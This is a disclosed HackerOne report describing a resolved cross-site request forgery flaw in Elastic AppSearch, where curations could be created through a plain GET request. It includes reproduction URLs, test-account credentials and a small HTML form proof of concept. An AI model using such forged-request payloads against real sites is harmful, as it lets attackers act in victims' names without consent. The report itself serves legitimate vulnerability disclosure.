---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1477050'
original_report_id: '1477050'
title: CSRF in AppSearch allows creation of "curations"
weakness: Cross-Site Request Forgery (CSRF)
team_handle: elastic
created_at: '2022-02-10T13:01:11.666Z'
disclosed_at: '2022-11-17T13:26:03.221Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 31
asset_identifier: Elastic Enterprise Search
asset_type: DOWNLOADABLE_EXECUTABLES
max_severity: critical
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF in AppSearch allows creation of "curations"

## Metadata

- HackerOne Report ID: 1477050
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: elastic
- Disclosed At: 2022-11-17T13:26:03.221Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary

Hello team! The curations creation for AppSearch engines can happen on a GET request which means there's no CSRF protection.

## Steps to reproduce

1. In one tab  visit this page on my Elastic Cloud instance: https://h1repro.kb.eu-west-1.aws.found.io:9243/app/enterprise_search/app_search/engines/national-parks-demo/curations (choose "Login with Elasticsearch", username `h1repro` / password `&Xb|MzZeB@<\`)
1. For a simple demonstration, in another tab you can simply visit `https://h1repro.kb.eu-west-1.aws.found.io:9243/internal/app_search/engines/national-parks-demo/curations/find_or_create?query=QUERY_YOU_WANT_TO_CREATE_HERE`

If you want a "real" CSRF PoC you can simply host an HTML file with the following content. Obviously a real attack wouldn't let you choose your payload and submit and this would be done automatically :)

```html
<html>
	<head></head>
	<body>
		<form action="https://h1repro.kb.eu-west-1.aws.found.io:9243/internal/app_search/engines/national-parks-demo/curations/find_or_create" method="get">
			<label for="query">Enter the curation you want to create: </label>
			<input type="text" name="query" id="query" required>
			<input type="submit">
		</form>
	</body>
</html>
```

## Impact

Creation of undesired "curations". Annoying attacks would either create a large quantity of them or it would create queries with foul language.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
